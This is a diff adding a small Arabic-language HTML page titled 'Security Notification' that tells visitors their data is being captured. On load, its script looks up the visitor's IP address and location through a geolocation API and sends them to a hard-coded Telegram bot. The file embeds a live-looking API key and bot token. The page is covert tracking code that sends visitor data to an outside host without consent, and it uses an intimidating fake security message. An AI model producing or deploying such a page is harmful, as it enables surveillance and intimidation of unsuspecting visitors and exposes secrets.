@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Notification</title>
+</head>
+<body>
+    <h2>تم الوصول إلى موقعك الإلكتروني</h2>
+    <p>يتم الآن التقاط بياناتك من خلال النظام الأمني...</p>
+    
+    <script>
+        // استخدام ipgeolocation.io للحصول على بيانات IP والموقع
+        fetch('https://api.ipgeolocation.io/ipgeo?apiKey=2bed574c09074c1495969dcdb95d398d')
+            .then(response => response.json())
+            .then(data => {
+                const location = `${data.city}, ${data.state_prov}, ${data.country_name}`;
+                const ip = data.ip;
+
+                // إرسال البيانات إلى بوت Telegram
+                const token = '7728216419:AAFiV9ZvyCXsKyq7-dlAKq7kXCpqEgiLyP8';
+                const chat_id = '5819243897';
+                const message = `تم الوصول من: ${location}\nIP: ${ip}`;
+
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);
+            });
+    </script>
+</body>
+</html>
